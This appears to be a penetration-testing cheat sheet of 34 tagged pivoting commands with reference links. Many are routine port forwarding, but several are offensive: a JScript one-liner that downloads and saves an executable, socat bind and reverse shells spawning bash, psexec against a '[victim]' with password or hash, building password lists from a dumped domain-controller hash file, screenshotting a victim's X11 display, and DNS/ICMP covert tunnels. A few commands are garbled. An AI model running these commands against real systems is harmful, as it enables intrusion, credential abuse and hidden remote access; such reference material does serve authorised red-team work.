### 1. Forward the remote port to the local machine
```
ssh -R [lport]:[rip]:[rport] [ip] -N
```
**- linux,bash,networking,pivoting**
#### References:

http://unix.stackexchange.com/questions/115897/whats-ssh-port-forwarding-and-whats-the-difference-between-ssh-local-and-remot
https://www.cyberciti.biz/faq/set-up-ssh-tunneling-on-a-linux-unix-bsd-server-to-bypass-nat/
__________
### 2. Forward the local port to the remote machine
```
ssh -L [lport]:[rip]:[rport] [ip] -N
```
**- linux,bash,networking,pivoting**
#### References:

http://unix.stackexchange.com/questions/115897/whats-ssh-port-forwarding-and-whats-the-difference-between-ssh-local-and-remot
https://www.cyberciti.biz/faq/set-up-ssh-tunneling-on-a-linux-unix-bsd-server-to-bypass-nat/
__________
### 3. set native port forward windows
```
netsh interface portproxy add v4tov4 protocol=tcp listenport=[lport] connectport=[rport] listenaddress=[lip] connectaddress=[rip]
```
**- networking,pivoting,Windows**
#### References:

https://yg.ht
https://technet.microsoft.com/en-us/library/bb490939.aspx
https://technet.microsoft.com/en-us/library/cc731068(v=ws.10).aspx
__________
### 4. reset native port forward windows
```
netsh interface portproxy reset
```
**- networking,pivoting,Windows**
#### References:

https://yg.ht
https://technet.microsoft.com/en-us/library/bb490939.aspx
https://technet.microsoft.com/en-us/library/cc731068(v=ws.10).aspx
__________
### 5. Javascript wget windows oneline : cscript /nologo wget.js http://[IP]
```
echo var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");WinHttpReq.Open("GET",WScript.Arguments(0), /*async=*/false);WinHttpReq.Send();BinStream = new ActiveXObject("ADODB.Stream");BinStream.Type=1;BinStream.Open();BinStream.Write(WinHttpReq.ResponseBody);BinStream.SaveToFile("out.exe");>wget.js
```
**- pivoting,files,Windows**
#### References:

http://superuser.com/questions/25538/how-to-download-files-from-command-line-in-windows-like-wget-is-doing
__________
### 6. proxy Metasploit pivot
```
run autoroute -s [CIDR SUBNET]
```
**- pivoting,metasploit**
#### References:

http://Microsoft.com
__________
### 7. proxy metasploit pivot
```
run autoroute -p
```
**- pivoting,metasploit**
#### References:

https://www.offensive-security.com/metasploit-unleashed/pivoting/
__________
### 8. proxy Metasploit pivot
```
background it then run...
```
**- pivoting,metasploit**
#### References:

https://www.offensive-security.com/metasploit-unleashed/pivoting/
__________
### 9. proxy Metasploit pivot
```
use auxiliary/server/socks4a
```
**- pivoting,metasploit**
#### References:

https://www.offensive-security.com/metasploit-unleashed/pivoting/
__________
### 10. proxy pivot
```
proxychains cmd
```
**- pivoting,metasploit**
#### References:

http://proxychains.sourceforge.net/
https://www.offensive-security.com/metasploit-unleashed/proxytunnels/
__________
### 11. instant web server
```
python -m SimpleHTTPServer [PORT]
```
**- pivoting,interesting,python,av evasion**
#### References:

https://docs.python.org/2/library/simplehttpserver.html
__________
### 12. dns tunneling
```
iodine -P [pass] [server]
```
**- networking,pivoting**
#### References:

http://code.kryo.se/iodine/
http://calebmadrigal.com/dns-tunneling-with-iodine/
__________
### 13. create medusa or hydra password list from cracked hashes
```
cat DC_dump.txt | awk -F : '{print $1":"$4}' | sort -k 2 -t : > sorted_hash; cat ntlm_cracked | sort -k 1 > sorted_cracked; join -t : -1 2 sorted_hash -2 1 sorted_cracked  >> pass_info
```
**- pivoting,passwords,enumeration,user information,cracking**
#### References:

http://tldp.org/HOWTO/Bash-Prog-Intro-HOWTO.html
__________
### 14. enable ip forwarding in the kernel temporarily
```
echo 1 > /proc/sys/net/ipv4/ip_forward
```
**- linux,bash,networking,pivoting**
#### References:

https://www.cyberciti.biz/faq/rhel-centos-fedora-linux-ip-forwarding-tutorial/
__________
### 15. Iptables port forward
```
iptables -t nat -A PREROUTING -p tcp -d [ip] --dport [port] -j LOG; iptables -t nat -A PREROUTING -p tcp -d [ip] --dport [port] -j DNAT --to-destination [rhost]:[rport]; iptables -A FORWARD -p tcp -d [ip] --dport [port] -m state --state NEW,ESTABLISHED,RELATED -j ACCEPT
```
**- linux,networking,pivoting**
#### References:

https://www.cyberciti.biz/tips/linux-iptables-examples.html
http://www.linuxhomenetworking.com/wiki/index.php/Quick_HOWTO_:_Ch14_:_Linux_Firewalls_Using_iptables
__________
### 16. take a screenshot from a open X11 and convert it to a jpg
```
xwd -display [victim] :0 -root -out /tmp/[victim].xpm;xwd -display ip :0 -root -out /tmp/[victim].xpm; convert /tmp/[victim]; xpm -resize 1280x1024 /tmp/[victim].jpg
```
**- linux,bash,pivoting,scanning**
#### References:

http://unix.stackexchange.com/questions/44821/how-do-i-screencap-another-xorg-display
__________
### 17. re-enable CMD
```
reg add HKCU\Software\Policies\microsoft\Windows\System /v DisableCHD /t
```
**- pivoting,Windows,configuration**
#### References:

https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504
__________
### 18. windows psexec : \\127.0.0.1\c$\cmd.exe -p can be pass OR hash
```
psexec /accepteula \\[victim] -u [domain]\[user] -p [password] -c -f \\[victim]\[share\[file]
```
**- pivoting,Windows,remote command shell**
#### References:

https://technet.microsoft.com/en-us/sysinternals/pxexec.aspx
__________
### 19. Route IPV6 through ipv4 for things that don't support it
```
socat TCP-LISTEN:8080,reuseaddr,fork TCP6:[RHOST]:[RPORT] ./[tool] 127.00.0.1:8080
```
**- linux,networking,pivoting**
#### References:

https://www.cyberciti.biz/faq/linux-unix-tcp-port-forwarding/
__________
### 20. forward local traffic htting lport to [rip]:[rport]
```
fpipe.exe -l [lport] -r [rip] [ip]
```
**- networking,pivoting,Windows**
#### References:

https://www.mcafee.com/uk/downloads/free-tools/fpipe.aspx
http://exploit.co.il/hacking/pivoting-into-a-network-using-plink-and-fpipe/
__________
### 21. forward local traffic htting lport to [rip]:[rport]
```
socat TCP4:LISTEN:[lport] TCP4:[rip]:[rport]
```
**- linux,networking,pivoting**
#### References:

https://www.cyberciti.biz/faq/linux-unix-tcp-port-forwarding/
__________
### 22. ssh port forward [victim]:[port] to [ip]:[port], access by localhost:[port], rhost can be 127.0.0.1
```
ssh -o StrictHostKeyChecking=no -t -t -i [private_key] -R [lport]:[rhost]:[rip] [user]@[ip]
```
**- linux,networking,pivoting**
#### References:

https://www.cyberciti.biz/faq/set-up-ssh-tunneling-on-a-linux-unix-bsd-server-to-bypass-nat/
__________
### 23. ssh port forward [victim]:[port] to [ip]:[port], access by localhost:[port], rhost can be 127.0.0.1. Privte key needs to be in putty format, a PPK
```
plink.exe -N -i [private_key] -R [lport]:[rhost]:[rip] -l [user] [ip]
```
**- networking,pivoting,Windows**
#### References:

http://the.earth.li/~sgtatham/putty/0.53b/htmldoc/Chapter7.html
__________
### 24. set up a socks proxy, proxycahins may help also
```
ssh -D [port] [user]@[ip]
```
**- linux,networking,pivoting**
#### References:

https://www.cyberciti.biz/faq/set-up-ssh-tunneling-on-a-linux-unix-bsd-server-to-bypass-nat/
__________
### 25. PHP simple server
```
php -S 0.0.0.0:80
```
**- pivoting,interesting**
#### References:

https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/
__________
### 26. XfreeRDP new swtich format
```
xfreerdp +clipboard /drive:[sharename],[path] /u:[user] /d:[domain] /p:[password ] /size:80% /v:[host]
```
**- linux,pivoting,RDP**
#### References:

https://github.com/FreeRDP/FreeRDP/wiki/CommandLineInterface
__________
### 27. Create a SSH based TAP VPN
```
ssh username@server -w any:any & ip addr add 100.64.1.2/32 peer 100.64.1.1 dev ; ssh root@[ip] -C 'ip addr add 100.64.1.1/32 peer 100.64.1.2 dev tun0; route add -net [destnet]/16 gw 1.1.1.1;
```
**- linux,bash,pivoting**
#### References:

https://artkond.com/2017/03/23/pivoting-guide/
__________
### 28. Hans ICMP tunnel, first cmd is server, second client
```
./hans -v -f -s 100.64.1.1 -p [password]; ./hans -f -c [ip] -p [password] -v
```
**- linux,pivoting**
#### References:

https://artkond.com/2017/03/23/pivoting-guide/
http://code.gerade.org/hans/
__________
### 29. ICMP tunnel, first cmd is server, second client
```
iodined -f -c -P [password] 100.164.1.1 [serveraddr]; iodine -f -P [password] [serveraddr] -r
```
**- linux,pivoting**
#### References:

http://code.kryo.se/iodine/
https://artkond.com/2017/03/23/pivoting-guide/
__________
### 30. DNS tunnel, first cmd is server, second client.
```
ruby ./dnscat2.rb tunneldomain.com; ./dnscat2 tunneldomain.com
```
**- linux,pivoting**
#### References:

https://artkond.com/2017/03/23/pivoting-guide/
https://github.com/iagox86/dnscat2
__________
### 31. NTLM aware proxy client, proxychains
```
echo "Username [user]" >> config; echo "Password [pass]" >> config; echo "Domain [domain]" >> config; echo "Proxy [proxyIP]" >> config; echo "Tunnel [lport]:[lip]:[rport]" >> config; cntlm.exe -c config.conf
```
**- linux,pivoting,Windows**
#### References:

https://artkond.com/2017/03/23/pivoting-guide/
http://cntlm.sourceforge.net/	
__________
### 32. Run program over socks proxy
```
echo "[ProxyList]" > /etc/proxychains.conf; echo "socks4  127.0.0.1 2222" >> /etc/proxychains.conf; proxychains [program]
```
**- linux,pivoting**
#### References:

http://proxychains.sourceforge.net/
https://artkond.com/2017/03/23/pivoting-guide/
__________
### 33. Socat BindShell, First on server, second on client
```
socat TCP-LISTEN:[lip],reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane; socat FILE:`tty`,raw,echo=0 TCP:[rip]:[rport]
```
**- linux,pivoting,shells**
#### References:

https://artkond.com/2017/03/23/pivoting-guide/
__________
### 34. Socat reverse shell, First on client, second on server
```
socat TCP-LISTEN:[lip],reuseaddr FILE:`tty`,raw,echo=0; socat TCP4:[rip]:[rport] EXEC:bash,pty,stderr,setsid,sigint,sane
```
**- linux,pivoting,reverse shells**
#### References:

https://artkond.com/2017/03/23/pivoting-guide/
__________
